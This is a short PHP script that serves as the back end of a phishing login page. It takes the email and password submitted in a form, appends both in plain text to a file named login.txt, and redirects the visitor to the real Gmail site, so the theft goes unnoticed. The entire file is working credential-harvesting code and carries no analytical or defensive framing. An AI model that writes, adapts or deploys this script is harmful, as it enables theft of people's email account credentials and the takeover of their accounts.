<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = htmlspecialchars($_POST['email']);
    $password = htmlspecialchars($_POST['password']);

    $log = "Email: " . $email . " | Password: " . $password . "\n";
    file_put_contents("login.txt", $log, FILE_APPEND);
    
    // Redirect to Gmail (or show a thank you page)
    header("Location: https://mail.google.com");
    exit();
}
?>
